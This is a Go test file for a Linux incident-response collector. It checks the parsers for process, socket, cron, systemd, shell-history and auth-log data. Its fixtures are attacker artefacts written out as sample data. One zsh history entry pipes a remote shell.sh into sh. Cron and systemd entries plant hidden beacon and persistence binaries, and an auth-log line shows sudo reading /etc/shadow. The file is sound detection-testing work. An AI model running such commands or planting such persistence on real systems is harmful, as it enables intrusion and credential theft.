//go:build linux

package collector

import (
	"os"
	"path/filepath"
	"testing"
)

func TestParseProcStatLine(t *testing.T) {
	// Process name containing spaces and parentheses to verify resilience against comm spoofing.
	statLine := "4210 (kworker/u16:2 (evil)) S 1054 4210 4210 0 -1 4194560 120 0 0 0 14 3 0 0 20 0 1 0 987654 12345678 500 18446744073709551615"
	comm, ppid, startTicks, err := parseProcStatLine(statLine)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if comm != "kworker/u16:2 (evil)" {
		t.Errorf("expected comm 'kworker/u16:2 (evil)', got %q", comm)
	}
	if ppid != 1054 {
		t.Errorf("expected ppid 1054, got %d", ppid)
	}
	if startTicks != 987654 {
		t.Errorf("expected startTicks 987654, got %d", startTicks)
	}
}

func TestDecodeHexEndpointAndProcNetLine(t *testing.T) {
	// 0100007F:0016 -> 127.0.0.1:22
	ip, port, err := decodeHexEndpoint("0100007F:0016")
	if err != nil {
		t.Fatalf("unexpected error decoding IPv4 hex endpoint: %v", err)
	}
	if ip != "127.0.0.1" || port != 22 {
		t.Errorf("expected 127.0.0.1:22, got %s:%d", ip, port)
	}

	inodeMap := map[string]procSocketOwner{
		"44556": {pid: 1337, name: "sshd"},
	}
	rawLine := "   0: 0100007F:0016 0A000001:D431 01 00000000:00000000 02:00000A12 00000000     0        0 44556 2 0000000000000000 20 4 30 10 -1"
	conn, ok := parseProcNetLine(rawLine, "tcp", inodeMap)
	if !ok {
		t.Fatalf("expected parseProcNetLine to succeed")
	}
	if conn.LocalAddress != "127.0.0.1" || conn.LocalPort != 22 {
		t.Errorf("unexpected local endpoint %s:%d", conn.LocalAddress, conn.LocalPort)
	}
	if conn.RemoteAddress != "1.0.0.10" || conn.RemotePort != 54321 {
		t.Errorf("unexpected remote endpoint %s:%d", conn.RemoteAddress, conn.RemotePort)
	}
	if conn.State != "ESTABLISHED" || conn.PID != 1337 || conn.ProcessName != "sshd" {
		t.Errorf("unexpected socket metadata: %+v", conn)
	}
}

func TestParseCronLine(t *testing.T) {
	// System crontab line with user field
	sysLine := "*/5 * * * * root /tmp/.hidden/beacon.sh --quiet"
	item, ok := parseCronLine(sysLine, "/etc/crontab", "2026-10-30T00:00:00Z", true, "")
	if !ok {
		t.Fatalf("expected system cron line to parse")
	}
	if item.User != "root" || item.TargetBinary != "/tmp/.hidden/beacon.sh" || item.Metadata["schedule"] != "*/5 * * * *" {
		t.Errorf("unexpected system cron parse result: %+v", item)
	}

	// User spool crontab with @reboot directive
	rebootLine := "@reboot /var/tmp/persist.elf"
	item2, ok := parseCronLine(rebootLine, "/var/spool/cron/crontabs/www-data", "2026-10-30T00:00:00Z", false, "www-data")
	if !ok {
		t.Fatalf("expected @reboot cron line to parse")
	}
	if item2.User != "www-data" || item2.TargetBinary != "/var/tmp/persist.elf" || item2.Metadata["schedule"] != "@reboot" {
		t.Errorf("unexpected @reboot cron parse result: %+v", item2)
	}

	// Environment variable line should be ignored
	if _, ok := parseCronLine("SHELL=/bin/bash", "/etc/crontab", "", true, ""); ok {
		t.Errorf("expected environment assignment to be skipped")
	}
}

func TestParseSystemdUnitContent(t *testing.T) {
	unitContent := `[Unit]
Description=Backdoor Telemetry Daemon
After=network.target

[Service]
Type=simple
User=root
ExecStartPre=/bin/chmod +x /opt/agent/run.sh
ExecStart=-/opt/agent/run.sh --daemon

[Install]
WantedBy=multi-user.target
`
	item, ok := parseSystemdUnitContent(unitContent, "/etc/systemd/system/telemetry.service", "2026-10-30T00:00:00Z")
	if !ok {
		t.Fatalf("expected systemd unit to parse")
	}
	if item.Name != "telemetry.service" || item.User != "root" || item.TargetBinary != "/opt/agent/run.sh" {
		t.Errorf("unexpected systemd item: %+v", item)
	}
	if item.Metadata["description"] != "Backdoor Telemetry Daemon" {
		t.Errorf("unexpected description metadata: %+v", item.Metadata)
	}
}

func TestParseShellHistoryAndAuthLogs(t *testing.T) {
	zshContent := `: 1730000001:0;whoami
: 1730000005:0;curl -fsSL http://10.10.14.5/shell.sh | sh
`
	hist := parseShellHistoryContent(zshContent, "/root/.zsh_history", "root", "2026-10-30T00:00:00Z", 10)
	if len(hist) != 2 {
		t.Fatalf("expected 2 history entries, got %d", len(hist))
	}
	if hist[1].Command != "curl -fsSL http://10.10.14.5/shell.sh | sh" {
		t.Errorf("unexpected zsh command: %q", hist[1].Command)
	}

	tests := []struct {
		line        string
		wantEventID string
		wantUser    string
		wantIP      string
	}{
		{
			line:        "Oct 30 00:12:01 prod-web-01 sshd[1920]: Accepted publickey for ubuntu from 192.168.1.50 port 51234 ssh2",
			wantEventID: "ssh_accepted",
			wantUser:    "ubuntu",
			wantIP:      "192.168.1.50",
		},
		{
			line:        "Oct 30 00:12:15 prod-web-01 sshd[1925]: Failed password for invalid user admin from 203.0.113.99 port 39112 ssh2",
			wantEventID: "ssh_failed",
			wantUser:    "admin",
			wantIP:      "203.0.113.99",
		},
		{
			line:        "2026-10-30T00:13:00Z prod-web-01 sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow",
			wantEventID: "sudo_exec",
			wantUser:    "ubuntu",
			wantIP:      "",
		},
		{
			line:        "Oct 30 00:14:00 prod-web-01 useradd[2100]: new user: name=svc_backup, UID=1005, GID=1005, home=/home/svc_backup, shell=/bin/bash",
			wantEventID: "useradd",
			wantUser:    "svc_backup",
			wantIP:      "",
		},
	}

	for _, tc := range tests {
		entry, ok := parseLinuxAuthLogLine(tc.line, "/var/log/auth.log", 2026)
		if !ok {
			t.Fatalf("failed to parse auth log line: %s", tc.line)
		}
		if entry.EventID != tc.wantEventID || entry.User != tc.wantUser || entry.SourceIP != tc.wantIP {
			t.Errorf("line %q -> got (%s, %s, %s), want (%s, %s, %s)",
				tc.line, entry.EventID, entry.User, entry.SourceIP, tc.wantEventID, tc.wantUser, tc.wantIP)
		}
	}
}

func TestHashFileSHA256AndModulesFlag(t *testing.T) {
	tmp := t.TempDir()
	sample := filepath.Join(tmp, "payload.bin")
	if err := os.WriteFile(sample, []byte("BTL1-DFIR-TRIAGE"), 0600); err != nil {
		t.Fatalf("write temp file: %v", err)
	}
	digest, err := HashFileSHA256(sample)
	if err != nil || len(digest) != 64 {
		t.Fatalf("expected valid 64-char SHA-256 hex digest, got %q (err=%v)", digest, err)
	}

	mods, err := ParseModulesFlag("persistence,logs,processes")
	if err != nil || len(mods) != 3 {
		t.Fatalf("unexpected ParseModulesFlag result: %v (err=%v)", mods, err)
	}
	if _, err := ParseModulesFlag("invalid_mod"); err == nil {
		t.Errorf("expected error for invalid module name")
	}
}
